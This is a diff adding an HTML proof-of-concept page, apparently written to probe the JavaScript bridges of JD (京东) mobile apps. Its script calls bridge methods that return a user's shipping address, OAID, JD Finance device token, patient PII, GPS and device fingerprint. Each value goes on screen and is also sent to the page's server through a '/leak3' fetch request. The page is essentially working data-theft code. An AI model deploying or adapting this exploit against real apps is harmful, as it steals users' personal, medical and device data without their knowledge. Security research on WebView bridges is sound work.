@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body { font-family: -apple-system, sans-serif; margin: 0; padding: 12px; background: #f5f5f5; }
+  h3 { margin: 4px 0 14px; font-size: 20px; }
+  .item { background: #fff; border-radius: 10px; padding: 14px 16px; margin-bottom: 10px; box-shadow: 0 1px 3px rgba(0,0,0,.08); }
+  .name { font-size: 16px; color: #1a66ff; font-weight: 600; word-break: break-all; }
+  .st { float: right; font-size: 13px; color: #999; }
+  .st.ok { color: #0a0; }
+  pre.val { font-size: 14px; white-space: pre-wrap; word-break: break-all; margin: 6px 0 0; color: #333; background:#fafafa; padding:6px; border-radius:4px; }
+</style>
+</head>
+<body>
+<h3>JSB 敏感桥</h3>
+<div id="items"></div>
+<script>
+var probes = [
+  {id:'addr',  label:"getVByK('USER_DEFAULT_RECEIVE_ADDRESS') — 任意key读SP·收货地址", fn:function(cb){ JDAppUnite.getVByK('USER_DEFAULT_RECEIVE_ADDRESS', cb); }},
+  {id:'oaid',  label:"getVByK('ANDROID_OAID') — 任意key读SP·OAID", fn:function(cb){ JDAppUnite.getVByK('ANDROID_OAID', cb); }},
+  {id:'dtok',  label:"DeviceFingerprintBridge.getDeviceToken — 京东金融设备token", fn:function(cb){ DeviceFingerprintBridge.getDeviceToken(cb, ''); }},
+  {id:'pinfo', label:"getLocalUserInfo — 当前就诊人PII", fn:function(cb){ JDAppUnite.getLocalUserInfo(cb); }},
+  {id:'pinfo2',label:"getJdhCurrentPatientInfo — 就诊人详情", fn:function(cb){ JDAppUnite.getJdhCurrentPatientInfo(cb); }},
+  {id:'login', label:"isAppLogin — 登录状态", fn:function(cb){ JDAppUnite.isAppLogin(cb); }},
+  {id:'phone', label:"getPhoneBasicInfo — GPS+设备信息", fn:function(cb){ JDAppUnite.getPhoneBasicInfo(cb); }},
+  {id:'finger',label:"getFingerInfo — 设备指纹eid", fn:function(cb){ JDAppUnite.getFingerInfo(cb); }},
+];
+var root = document.getElementById('items');
+probes.forEach(function(p){
+  var div = document.createElement('div');
+  div.className = 'item';
+  div.innerHTML = '<div><span class="st" id="st_'+p.id+'">调用中…</span><span class="name">'+p.label+'</span></div><pre class="val" id="val_'+p.id+'"></pre>';
+  root.appendChild(div);
+  var cb = function(v){
+    var el = document.getElementById('val_'+p.id);
+    var st = document.getElementById('st_'+p.id);
+    st.textContent = '✓ 已返回'; st.className = 'st ok';
+    var show = v;
+    try { if (typeof v === 'string' && (v.charAt(0)==='{')) show = JSON.stringify(JSON.parse(v), null, 1);
+          else if (typeof v === 'object') show = JSON.stringify(v, null, 1); } catch(e){}
+    el.textContent = String(show);
+    try { fetch('/leak3?t='+p.id+'&d='+encodeURIComponent(String(v))); } catch(e){}
+  };
+  window['cb_'+p.id] = cb;
+  try { p.fn('cb_'+p.id); }
+  catch(e){ document.getElementById('st_'+p.id).textContent='✗ 调用失败'; document.getElementById('val_'+p.id).textContent = String(e); }
+});
+</script>
+</body>
+</html>
